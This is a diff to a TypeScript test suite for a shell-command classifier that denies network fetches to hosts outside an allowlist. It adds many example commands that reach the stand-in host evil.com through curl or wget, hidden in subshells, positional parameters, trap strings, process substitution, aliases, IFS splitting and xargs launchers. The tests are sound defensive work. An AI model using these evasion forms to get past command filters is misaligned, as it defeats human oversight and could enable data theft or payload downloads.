@@ -1252,8 +1252,13 @@ describe('delta review: shell strings, positionals, nesting, unparseable', () =>
     expect(d(`sh -c 'curl -s "\${2}"' _ ${U} https://evil.com/x`).deny).toBe(true)
     expect(d(`sh -c 'wget "$1"' _ ${U}`).deny).toBe(false)
     expect(d(`sh -c 'set -e; wget -q "$1"' _ ${U}`).deny).toBe(false)
+    // "$@" / $* are substituted too, split the way bash splits them (delta review 5572280679)
+    expect(d(`sh -c 'wget "$@"' _ ${U}`).deny).toBe(false)
+    expect(d(`sh -c 'curl $*' _ ${U}`).deny).toBe(false)
+    expect(d(`sh -c 'wget "$@"' _ ${U} https://evil.com/x`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d(`sh -c 'curl $*' _ https://evil.com/x`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
     // not faithfully substitutable, so denied when the body fetches
-    for (const c of [`sh -c 'wget "$@"' _ ${U}`, `sh -c 'curl $*' _ ${U}`, `sh -c 'shift; wget "$1"' _ ${U} https://evil.com`,
+    for (const c of [`sh -c 'shift; wget "$1"' _ ${U} https://evil.com`, `sh -c 'wget "\${@:2}"' _ ${U} https://evil.com`,
       `sh -c 'set -- https://evil.com; wget "$1"' _ ${U}`, `sh -c 'wget "\${1:-https://evil.com}"' _`, `sh -c 'wget "$1"' _ "${U} https://evil.com"`]) {
       expect({ c, r: d(c).reason }).toEqual({ c, r: 'shell-c-positional' })
     }
@@ -1392,8 +1397,11 @@ describe('delta review 5529333917: functions, launchers, expanded command words'
     expect(d('f() { sh; }; echo "curl https://evil.com" | f')).toMatchObject({ deny: true, reason: 'function-shell-stdin' })
   })
   it('1. what cannot be substituted, or a call the parser does not see, fails closed', () => {
-    expect(d('f() { curl "$@"; }; f https://evil.com')).toMatchObject({ deny: true, reason: 'function-positional' })
-    expect(d(`f() { curl "$1"; }; trap 'f https://evil.com' EXIT`)).toMatchObject({ deny: true, reason: 'function-indirect' })
+    expect(d('f() { curl "$@"; }; f https://evil.com')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('f() { shift; curl "$1"; }; f x https://evil.com')).toMatchObject({ deny: true, reason: 'function-positional' })
+    // a trap string is read like eval (delta review 5572280679), so the call in it is judged with its URL
+    expect(d(`f() { curl "$1"; }; trap 'f https://evil.com' EXIT`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d(`f() { curl "$1"; }; trap f EXIT`)).toMatchObject({ deny: true, reason: 'function-indirect' })
     expect(d(`f() { curl "$1"; }; export -f f; bash -c 'f https://evil.com'`)).toMatchObject({ deny: true, reason: 'function-indirect' })
   })
   it('1. CONTROL: local calls, a never-called definition, a comment, a recursive helper pass', () => {
@@ -1473,6 +1481,74 @@ describe('delta review 5529333917: functions, launchers, expanded command words'
       'echo {a,b}.txt', 'ls ~/{a,b}', 'ls /usr/bin/py*', '/usr/bin/pytho? -V', '{ls,-la}',
       '"$S/run.sh" x', '$HOME/bin/tool', 'echo $(( 1 + $(date +%s) ))', 'a=(x y); echo "${a[@]}"',
       'ex=(--extra ${X[q]}); echo "${ex[@]}"', 'exec 3<>/dev/null',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+})
+
+describe('delta review 5572280679: subshells, quoted word lists, process substitution, trap', () => {
+  const U = 'https://download.geofabrik.de/x'
+  const d = (c: string) => classify(c, 0, new Set(['download.geofabrik.de']), new Set())
+  it('1. a subshell written without a space is read as the command it runs', () => {
+    for (const c of ['(curl https://evil.com)', '(wget https://evil.com)', 'true && (curl https://evil.com)',
+      '(curl https://evil.com) | cat', '((curl https://evil.com))', 'x=1; (cd /tmp; (wget https://evil.com))',
+    ]) expect({ c, r: d(c) }).toMatchObject({ c, r: { deny: true, hosts: ['evil.com'] } })
+  })
+  it('2. a quoted word list used as the command splits the way bash splits it', () => {
+    for (const c of ['f(){ "$@"; }; f curl https://evil.com', 'f(){ "$1" "$2"; }; f curl https://evil.com',
+      'f(){ "${@}"; }; f wget https://evil.com', '"curl" "https://evil.com"',
+    ]) expect({ c, r: d(c) }).toMatchObject({ c, r: { deny: true, hosts: ['evil.com'] } })
+    expect(d('X=(curl https://evil.com); "${X[@]}"')).toMatchObject({ deny: true, reason: 'expanded-command' })
+    expect(d('f(){ "$@"; }; f curl -s http://localhost:3420/x').deny).toBe(false)
+    expect(d(`f(){ "$@"; }; f wget -q ${U}`).deny).toBe(false)
+    expect(d('f(){ "$@"; }; f ls -la').deny).toBe(false)
+    // an argument naming curl that cannot be substituted denies: the CALL names the verb, not the body
+    expect(d('f(){ watch "\${1:-x}"; }; f "curl https://evil.com"')).toMatchObject({ deny: true, reason: 'function-positional' })
+    expect(d('f(){ watch "\${1:-x}"; }; f "ls -la"').deny).toBe(false)
+    for (const c of ['f(){ eval "\${1:-x}"; }; f "curl https://evil.com"', 
+      'f(){ sh <<< "\${1:-x}"; }; f "curl https://evil.com"', 'f(){ echo "\${1:-x}" | sh; }; f "curl https://evil.com"',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    // "$*" is ONE word: bash looks for a program named "curl https://evil.com"
+    expect(d('f(){ "$*"; }; f curl https://evil.com').deny).toBe(false)
+  })
+  it('3. a shell reading its program from a substitution denies, like a pipe', () => {
+    for (const c of ['bash <(echo curl https://evil.com)', 'sh <(echo curl https://evil.com)', 'bash -x <(cat x)',
+      'bash < <(echo curl https://evil.com)', 'sh -- <(echo wget https://evil.com)', 'bash $(mktemp)',
+    ]) expect({ c, r: d(c) }).toMatchObject({ c, r: { deny: true, reason: 'shell-substitution' } })
+    // a substitution the script gets as an ARGUMENT, or one fed to another program, is not its program
+    for (const c of ['bash script.sh <(ls)', 'diff <(ls a) <(ls b)', 'bash -c "echo $(date)"'])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('4. a trap string gets the same analysis as bash -c', () => {
+    expect(d("trap 'curl https://evil.com' EXIT")).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('trap "wget https://evil.com" EXIT')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d("trap -- 'curl https://evil.com' INT TERM")).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    for (const c of ['trap "rm -f /tmp/x" EXIT', 'trap - EXIT', 'trap -p', "trap '' INT", `trap 'curl -s http://localhost:3420/x' EXIT`])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+    expect(shellCommandCall('trap', "trap 'curl x' EXIT")).toEqual({ body: 'curl x', args: [] })
+    expect(shellCommandCall('trap', 'trap EXIT')).toBe(null)
+  })
+  it('non-blocking: IFS, a copy from a substitution, an alias, --dns-servers', () => {
+    expect(d('IFS=_; c=curl_https://evil.com; $c')).toMatchObject({ deny: true, reason: 'ifs-expanded-command' })
+    expect(d('IFS=, read -r a b <<< "x,y"; echo $a').deny).toBe(false)
+    expect(d('cp $(which curl) /tmp/c; /tmp/c https://evil.com')).toMatchObject({ deny: true, reason: 'launched' })
+    expect(d('X=$(command -v wget); cp "$X" /tmp/w')).toMatchObject({ deny: true, reason: 'launched' })
+    expect(d('cp "$(readlink -f "$(which curl)")" /tmp/c')).toMatchObject({ deny: true, reason: 'launched' })
+    expect(d('echo $(which curl); ls -l `which wget`').deny).toBe(false)
+    expect(d('shopt -s expand_aliases; alias c=curl\nc https://evil.com')).toMatchObject({ deny: true, reason: 'alias' })
+    expect(d(`alias c='cu""rl'`)).toMatchObject({ deny: true, reason: 'alias' })
+    expect(d('alias ll="ls -la"').deny).toBe(false)
+    expect(d(`curl --dns-servers 1.2.3.4 ${U}`)).toMatchObject({ deny: true, hosts: ['1.2.3.4'] })
+    expect(d(`curl --dns-servers 10.0.0.1,8.8.8.8:53 ${U}`)).toMatchObject({ deny: true, hosts: ['8.8.8.8'] })
+    expect(d(`wget --dns-servers=1.1.1.1 ${U}`)).toMatchObject({ deny: true, hosts: ['1.1.1.1'] })
+    expect(d(`curl --dns-servers 10.0.0.1 ${U}`).deny).toBe(false)
+  })
+  it('follow-up: a launcher adds its INPUT, so the shell it starts is not substituted from the visible words', () => {
+    for (const c of [`echo "curl https://evil.com" | xargs sh -c '$0 "$@"'`, `echo "curl https://evil.com" | xargs sh -c '"$@"' _`,
+      'echo "curl https://evil.com" | xargs -I{} sh -c {}', 'echo curl | xargs -I{} {} https://evil.com',
+      'echo curl | xargs -I% % https://evil.com', 'echo curl | parallel {} https://evil.com',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    for (const c of ['ls | xargs -I{} cp {} /tmp', `ls | xargs -I{} sh -c 'echo {}'`, `ls | xargs -n1 sh -c 'wc -l "$0"'`,
+      `find . -iname '*.md' -exec sh -c 'wc -l "$1"' _ {} \\;`,
     ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
   })
 })
